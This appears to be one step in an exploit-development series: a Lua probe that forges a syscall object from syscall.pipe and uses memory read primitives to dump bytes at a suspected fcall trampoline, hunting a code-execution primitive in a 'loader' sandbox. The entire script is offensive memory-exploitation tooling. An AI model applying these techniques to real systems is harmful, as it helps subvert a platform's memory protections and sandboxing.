-- CRASH_CLASS: LOW
-- PROBE 514b: read the fcall stub the loader points fn_addr at.
--
-- 514a: the fn slot holds 0x00009FE5_108BC130, whose low 32 bits (0x108BC130)
-- sit 0x2160 bytes after the slot inside the same heap block (base 0x3_108B....).
-- That reads as a heap pointer carrying a 16-bit tag instead of the 0x3 heap tag.
-- If the loader calls into that heap address it is executable loader memory (a
-- trampoline), which would be a raw code primitive.  This dumps its bytes.
--
-- memory.read_byte returns a 1-char string on this loader, which is why 510e
-- printed binary; every byte is converted with string.byte here.

print("=== PROBE 514b: FCALL STUB BYTES ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "string" then return #v == 1 and string.byte(v) or 0 end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return to_num(val.h), to_num(val.l) end
    return 0, tonumber(val) or 0
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end
    return nil
end
local function rb(a)
    local ok, v = pcall(function() return memory.read_byte(a) end)
    if not ok then return nil end
    if type(v) == "string" then return #v == 1 and string.byte(v) or nil end
    return tonumber(v)
end
local function hexline(a, n)
    local s = ""
    for i = 0, n - 1 do
        local b = rb(a + i)
        s = s .. (b and string.format("%02X ", b) or "?? ")
    end
    return s
end

local sc_getpid = make_syscall(20)
local pipe_str = tostring(syscall.pipe)
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
pcall(function() return sc_getpid() end)
if not fn_str then print("no fn slot"); print("=== DONE ==="); return end
local fn_slot = uint64(fn_str)
local v = rq(fn_slot)
if v == nil then print("unreadable slot"); print("=== DONE ==="); return end
local h, l = get_hi_lo(v)
print(string.format("[0] slot=%s value=0x%08X_%08X", fn_str, h, l))

-- rebuild the full heap pointer: 0x3 is the heap tag observed on every other
-- pointer in this block, so try (3 << 32) | low32.
local cand = 0x300000000 + l
print(string.format("[1] candidate heap pointer = 0x%X", cand))
print("[1] bytes at candidate:")
for row = 0, 3 do
    print(string.format("    %08X  %s", cand + row * 16, hexline(cand + row * 16, 16)))
end

-- also dump around the slot itself for context
print("[2] bytes before the slot:")
for row = 0, 1 do
    local a = fn_slot - 0x30 + row * 16
    print(string.format("    %s  %s", tostring(a), hexline(a, 16)))
end

-- and the words in the 0x80 bytes that follow the slot
print("[3] qwords after the slot:")
for i = 0, 15 do
    local q = rq(fn_slot + i * 8)
    if q ~= nil then
        local qh, ql = get_hi_lo(q)
        print(string.format("    +%02X 0x%08X_%08X", i * 8, qh, ql))
    end
end
print("=== DONE ===")
